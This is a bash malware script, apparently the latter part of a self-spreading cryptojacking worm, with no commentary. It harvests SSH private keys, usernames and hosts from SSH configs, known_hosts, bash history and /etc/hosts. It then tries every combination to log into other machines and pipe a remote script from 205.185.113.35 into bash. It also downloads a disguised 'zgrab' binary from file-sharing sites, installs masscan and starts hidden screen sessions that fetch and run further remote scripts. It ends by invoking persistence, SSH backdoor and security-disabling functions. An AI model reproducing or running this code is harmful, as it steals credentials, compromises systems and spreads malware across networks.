KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep HostName|awk -F "HostName" '{print $2}')
HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)"| grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)"|tr ':' ' '|awk -F '@' '{print $2}' | awk -F '{print $1}')
HOSTS4=$(cat /etc/hosts| grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts| grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
USERZ=$(echo "root" ;find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -wv ".ssh" )
USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)"| tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq )
sshports=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)"| tr ':' ' ' | awk -F '-p' '{print $2}' | awk '{print $1}' | sed 's/[^0-9]*//g'  | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | sed -e "\$a22")
userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | grep -vw "." | grep -vw "ssh" | sed '/\./d')
hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
i=0
for user in $userlist
do
for host in $hostlist
do
for key in $keylist
do
for sshp in $sshports
do
((i++))
if [ "${i}" -eq "20" ]; then sleep 5;
ps wx|grep "ssh -o"|awk '{print $1}' | xargs kill -9&>/dev/null&
i=0
fi;

#Wait 5 seconds after every 20 attempts and clean up hanging processes

chmod +r $key
chmod 400 $key
echo "$user@$host"
ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "sudo curl -L http://205.185.113.35/files/alduro | sudo bash -s;"
ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "curl -L http://205.185.113.35/files/alduro | bash -s;"
done
done
done
done
}

scango (){
dpkg --configure -a;
screen -wipe >/dev/null;
ps aux | grep "dmS snack" | grep -vw grep >/dev/null
if [ $? -eq 0 ]
then
echo "running"
else
echo "need to start"
pkill screen;
cat /etc/os-release | grep -vw grep | grep "rhel" >/dev/null
if [ $? -eq 0 ]
then
yum remove epel-release -y
rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm;
rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm;
else
echo "no need"
fi
if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"
then
echo ""
else
zgrabz1="http://uupload.ir/files/"
zgrabz2="https://s.put.re/"
zgrabscrape1="https://fuskbugg.se/"
zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
chattr -iua /usr/bin/zgrab;
curl -L -o /usr/bin/zgrab $(curl -sL $zgrabscrape1${zgrabscrapear1[$RANDOM % ${#zgrabscrapear1[@]}]} | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
chmod +x /usr/bin/zgrab;
fi
if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"
then
echo ""
else
zgrabz1="http://uupload.ir/files/"
zgrabz2="https://s.put.re/"
zgrabscrape1="https://fuskbugg.se/"
zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
chattr -iua /usr/bin/zgrab;
curl -L -o /usr/bin/zgrab $zgrabz1${zgrabzar1[$RANDOM % ${#zgrabzar1[@]}]} || curl -sKL -o /usr/bin/zgrab $zgrabz2${zgrabzar2[$RANDOM % ${#zgrabzar2[@]}]};
chmod +x /usr/bin/zgrab;
fi
if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"
then
echo ""
else
zgrabz1="http://uupload.ir/files/"
zgrabz2="https://s.put.re/"
zgrabscrape1="https://fuskbugg.se/"
zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
chattr -iua /usr/bin/zgrab;
curl -L -o /usr/bin/zgrab $zgrabz1${zgrabzar1[$RANDOM % ${#zgrabzar1[@]}]} || curl -sKL -o /usr/bin/zgrab $zgrabz2${zgrabzar2[$RANDOM % ${#zgrabzar2[@]}]};
chmod +x /usr/bin/zgrab;
fi
which masscan >/dev/null
if [ $? -eq 0 ]
then
echo ""
else
yum install -y masscan || apt-get install masscan -y
chmod +x /var/run/*
fi

which jq >/dev/null
if [ $? -eq 0 ]
then
echo ""
else
yum install -y jq | apt-get install jq -y
fi
which screen
if [ $? -eq 0 ]
then
echo ""
else
yum install -y screen || apt-get install screen -y;
fi
scanscrape1="http://205.185.113.35/files/"
actionscrape="https://letsupload.cc/"
scanarray1=("mxutzh.sh" "qiumb.sh")
scrapeurl=$(curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]}  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
rndscreen0=snack$(head /dev/urandom | tr -dc a-z0-9 | head -c 5);
screen -dmS $rndscreen0;
sleep 1s;
#goog
screen -r $rndscreen0 -p 0 -X stuff $"bash\n";
screen -r $rndscreen0 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"3eS7MaDcn6  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
sleep 2s;
rndscreen1=snack$(head /dev/urandom | tr -dc a-z0-9 | head -c 5);
screen -dmS $rndscreen1;
sleep 1s;
#amz
screen -r $rndscreen1 -p 0 -X stuff $'bash\n';
screen -r $rndscreen1 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"lbS4M5Dbn2  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
sleep 2s;
rndscreen2=snack$(head /dev/urandom | tr -dc a-z0-9 | head -c 5);
screen -dmS $rndscreen2;
sleep 1s;
#ovh
screen -r $rndscreen2 -p 0 -X stuff $'bash\n';
screen -r $rndscreen2 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"J2S1MaDbn9  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
sleep 2s;
rndscreen3=snack$(head /dev/urandom | tr -dc a-z0-9 | head -c 5);
screen -dmS $rndscreen3;
sleep 1s;
#cn
screen -r $rndscreen3 -p 0 -X stuff $'bash\n';
screen -r $rndscreen3 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"r6SdMfD8n5  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
sleep 2s;
rndscreen4=snack$(head /dev/urandom | tr -dc a-z0-9 | head -c 5);
screen -dmS $rndscreen4;
sleep 1s;
#do
screen -r $rndscreen4 -p 0 -X stuff $'bash\n';
screen -r $rndscreen4 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"B1S4M1D7n9  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
sleep 2s;
rndscreen5=snack$(head /dev/urandom | tr -dc a-z0-9 | head -c 5);
screen -dmS $rndscreen5;
sleep 1s;
#de
screen -r $rndscreen5 -p 0 -X stuff $'bash\n';
screen -r $rndscreen5 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"v6S5M6D4n8  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
sleep 2s;
rndscreen6=snack$(head /dev/urandom | tr -dc a-z0-9 | head -c 5);
screen -dmS $rndscreen6;
sleep 1s;
#msft
screen -r $rndscreen6 -p 0 -X stuff $'bash\n';
screen -r $rndscreen6 -p 0 -X stuff $"curl -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"B1S4M1D7n9  | grep  -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n";
fi
}

filesetupgo
persistgo
filerungo
securitygo
sshaddusergo
sshkeysgo
resetsshgo
scango
localgo
